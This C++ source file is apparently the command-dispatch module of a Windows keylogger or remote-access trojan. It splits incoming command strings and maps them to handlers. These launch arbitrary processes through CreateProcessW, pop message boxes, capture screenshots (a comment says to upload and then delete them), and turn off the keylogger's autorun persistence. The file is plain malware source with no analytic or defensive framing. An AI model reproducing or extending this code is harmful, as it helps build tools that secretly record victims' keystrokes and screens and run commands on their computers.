#include "stdafx.h"
#include "CommandExe.h"
#include "Hax.h"
#include "Keylogger.h"
#include "Screenshot.h"

static std::vector<std::string> split(const std::string &s, char delim) {
    std::stringstream ss(s);
    std::string item;
    std::vector<std::string> elems;
    while(std::getline(ss, item, delim)) {
        elems.push_back(item);
    }
    return elems;
}

inline std::string join_at_index(const std::vector<std::string> &v, std::string delim, int index = 0) {
    std::string out;
    std::for_each(v.begin() + index, v.end(), [&](const std::string &s) { out += s + delim; });
    return out;
}

struct command_t {
    std::string name;
    std::function<void(std::vector<std::string>)> func;
};

command_t commandDefs[] = {
    {
        "batch", [](std::vector<std::string> args) {
            if(!args.size())
                return;

            std::string fileArgs = join_at_index(args, " ");
            wchar_t dest[_MAX_PATH];
            mbstowcs(dest, fileArgs.c_str(), _MAX_PATH);

            PROCESS_INFORMATION pi;
            ZeroMemory(&pi, sizeof(pi));

            STARTUPINFO si;
            ZeroMemory(&si, sizeof(si));

            si.cb = sizeof(si);

            CreateProcessW(NULL, dest, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        }
    },
    {
        "msgbox", [](std::vector<std::string> args) {
            if(!args.size())
                return;

            std::string msgboxText = join_at_index(args, " ");
            wchar_t text[1024];
            mbstowcs(text, msgboxText.c_str(), 1024);
            MessageBoxW(NULL, text, NULL, MB_OK);
        }
    },
    {
        "screenshot", [](std::vector<std::string> args) {
            TakeScreenshot(_T("screen.png"));
            // upload and then delete
        }
    },
    {
        "remove", [](std::vector<std::string> args) {
            keylogger.SetAutorun(false);
        }
    }
};

CommandExe::CommandExe()
{

}

CommandExe::~CommandExe()
{

}

void CommandExe::Run(std::string cmds)
{
    if(cmds.size() == 0) {
        return;
    }

    std::vector<std::string> commands = split(cmds, ';');
    for(auto &cmd : commands) {
        std::vector<std::string> args = split(cmd, ' ');
        if(args.size()) {
            auto result = std::find_if(std::begin(commandDefs), std::end(commandDefs), [&](const command_t & cmd) { return cmd.name == args[0].c_str(); });
            if(result != std::end(commandDefs)) {
                (*result).func(split(join_at_index(args, " ", 1), ' '));
            }
        }
    }
}